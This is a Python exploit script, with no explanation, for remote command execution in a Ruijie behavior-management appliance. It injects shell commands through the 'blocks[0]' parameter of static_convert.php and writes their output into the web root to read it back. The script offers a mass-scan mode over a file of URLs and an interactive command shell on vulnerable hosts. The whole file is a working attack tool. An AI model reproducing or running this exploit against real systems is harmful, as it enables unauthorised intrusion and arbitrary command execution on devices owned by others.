import requests
import urllib3
from urllib.parse import urljoin,quote
import argparse
import ssl
import urllib.request
ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls

def check(url):
    url = url.rstrip("/")
    target = url+"/view/IPV6/naborTable/static_convert.php?blocks[0]=||echo%20'HelloWorldTest'>/var/www/html/tmptest%0A"
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
    }
    try:
        response = urllib.request.Request(target, headers=headers, method="GET", unverifiable=True)
        res = urllib.request.urlopen(response)
        status_code = res.getcode()
        content = res.read().decode()
        if status_code == 200 and 'var' in content:
            result_url = urljoin(url,'/tmptest')
            result_response = requests.get(result_url, headers=headers, verify=False)
            if result_response.status_code == 200 and 'HelloWorldTest' in result_response.text:
                print(f"\033[31mDiscovered:{url}: Ruijie_BehaviorManagement_staticconvert_RCE!\033[0m")
                return True
    except Exception as e:
        print(e)

def run(url):
    url = url.rstrip("/")
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
    }
    if check(url):
        while True:
            command = input("\033[34mPlease input command (stop input:exit):\033[0m")
            command = quote(command)
            target = url + "/view/IPV6/naborTable/static_convert.php?blocks[0]=||{}>/var/www/html/tmpkls%0A".format(command)
            if "exit" not in command:
                try:
                    response = urllib.request.Request(target, headers=headers, method="GET", unverifiable=True)
                    res = urllib.request.urlopen(response)
                    status_code = res.getcode()
                    content = res.read().decode()
                    if status_code == 200 and 'var' in content:
                        result_url = urljoin(url, '/tmpkls')
                        result_response = requests.get(result_url, headers=headers, verify=False)
                        if result_response.status_code == 200:
                            print(result_response.text)
                except Exception as e:
                    pass
            else:
                break

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    args = parser.parse_args()
    url = args.url
    txt = args.txt
    if url:
        run(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)
    else:
        print("help")